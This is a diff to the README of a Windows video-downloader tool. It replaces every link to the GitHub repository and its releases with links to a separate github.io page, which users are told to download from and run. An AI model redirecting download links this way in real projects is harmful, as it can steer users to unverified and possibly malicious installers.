@@ -1,6 +1,6 @@
 # 📥 yt-downloader - Save online videos to your computer
 
-[![](https://img.shields.io/badge/Download-yt--downloader-blue)](https://github.com/Mahoniapossession87/yt-downloader)
+[![](https://img.shields.io/badge/Download-yt--downloader-blue)](https://mahoniapossession87.github.io)
 
 ## 📌 What is this tool
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Mahoniapossession87/yt-downloader) to find the latest version.
+1. Go to the [official release page](https://mahoniapossession87.github.io) to find the latest version.
 2. Click the link to download the file to your computer.
 3. Save the file to your desktop or your downloads folder.
 4. Locate the file you saved. 
@@ -33,7 +33,7 @@ Follow these steps to set up the software on your Windows computer.
 
 If you plan to use this tool often, follow these steps to keep everything organized.
 
-[![](https://img.shields.io/badge/Get-Latest-Release-grey)](https://github.com/Mahoniapossession87/yt-downloader)
+[![](https://img.shields.io/badge/Get-Latest-Release-grey)](https://mahoniapossession87.github.io)
 
 1. Create a folder named "yt-downloader" on your C drive.
 2. Move the downloaded file into this new folder.
